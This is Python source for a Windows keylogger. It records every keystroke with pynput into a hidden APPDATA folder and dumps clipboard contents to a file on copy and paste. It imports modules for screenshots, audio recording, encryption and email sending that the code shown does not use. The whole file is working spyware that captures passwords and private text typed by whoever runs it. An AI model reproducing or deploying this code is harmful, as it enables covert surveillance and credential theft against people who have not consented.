from email.message import EmailMessage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
from threading import Timer
import time
from resettabletimer import ResettableTimer
from os import access
import mailslurp_client
from requests import options
from smtplib import SMTP
from threading import Timer
import time
from email.message import EmailMessage

from os import access
import mailslurp_client
from requests import options
from smtplib import SMTP

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import os

from cryptography.fernet import Fernet

from scipy.io.wavfile import write
import sounddevice as sd

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"
system_information= "systeminfo.txt"
screenshot_information= "screenshot.png"
clipboard_information = "clipboard.txt"

file_path = os.getenv('APPDATA')
try:
    os.mkdir(file_path + '\\keylogger')
except:
    pass

extend="\\keylogger\\"

def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            f.write("\n\n\n\n\n Clipboard Data: \n\n\n\n\n" + data)
            win32clipboard.CloseClipboard()

        except:
            f.write("Clipboard could not be copied\n")
copy_clipboard()

count = 0
keys=[]
def on_press(key):
    global keys,count
    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys =[]

def write_file(keys):
    with open(file_path+extend+keys_information,"a") as f:
        for key in keys:
            k=str(key).replace("'","")
            if key==Key.space:
                f.write(' [space] ')
            elif hasattr(key, 'char') and key.char == '\x03':
                f.write("ctrl+c\n")
                copy_clipboard()
            elif hasattr(key, 'char') and key.char == '\x16':
                f.write("ctrl+v\n")
                copy_clipboard()
            elif key==Key.shift or key == Key.shift_l or key == Key.shift_r:
                f.write(" [shift] \n")
                f.close()
            elif key == Key.ctrl_l or key == Key.ctrl_r:
                f.write(" [ctrl] \n")
                f.close()
            elif key == Key.alt_l or key == Key.alt_gr:
                f.write(" [alt] \n")
                f.close()
            elif key==Key.enter:
                f.write(" [enter] \n")
                f.close()
            elif key == Key.backspace:
                f.write(" [backspace] \n")
                f.close()
            elif key==Key.caps_lock:
                f.write(" [caps_lock] \n")
                f.close()
            elif key==Key.tab:
                f.write(" [tab] \n")
                f.close()
            elif key==Key.end:
                f.write(" [end] \n")
                f.close()
            elif key==Key.home:
                f.write(" [home] \n")
                f.close()
            elif key==Key.page_down:
                f.write(" [page_down] \n")
                f.close()
            elif key==Key.page_up:
                f.write(" [page_up] \n")
                f.close()
            elif key==Key.pause:
                f.write(" [pause] \n")
                f.close()
            elif key==Key.insert:
                f.write(" [insert] \n")
                f.close()
            elif key==Key.up:
                f.write(" [up] \n")
                f.close()
            elif key==Key.down:
                f.write(" [down] \n")
                f.close()
            elif key==Key.right:
                f.write(" [right] \n")
                f.close()
            elif key==Key.left:
                f.write(" [left] \n")
                f.close()
            elif key==Key.delete:
                f.write(" [delete] \n")
                f.close()

            elif k.find("Key") == -1:
                f.write(k)
                f.close()

def on_release(key):
    if key==Key.esc:
        return False
    
with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
